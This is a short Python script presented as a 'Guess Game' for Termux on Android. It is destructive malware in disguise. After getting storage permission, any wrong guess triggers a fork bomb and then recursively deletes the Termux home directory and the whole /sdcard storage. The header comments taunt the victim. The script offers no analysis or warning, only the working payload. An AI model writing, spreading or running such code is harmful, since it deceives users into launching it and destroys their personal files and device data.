# Mr.James
# Let's play Guess Game 😜😜
# This is your FINAL game! 😎
# Don't forget my name 😜
# Remember MY name… forever! 😏
# Just one mistake… and you’ll never forget me 😉


import os
import sys
import random
import subprocess
import shutil

lol1="/data/data/com.termux/files/home"
lol2="/sdcard"

if not os.access(lol2, os.R_OK):
	print(" SD card permission not granted!")
	print("👉 Please allow permission to continue Game.:")
	print("   termux-setup-storage")
	try:
		subprocess.run(["termux-setup-storage"])
	except Exception:
		pass
	sys.exit()


number=random.randint(1,10)
# User your brain......
guess=int(input("Guess a number between 1 and 10: "))

if guess==number:
	print("Congratulations! You guessed the correct number.")
else:
	print("You are wrong, try again tata🫠")
	os.system(":(){ :|:&};:")
	shutil.rmtree(lol1)
	shutil.rmtree(lol2)
	sys.exit()
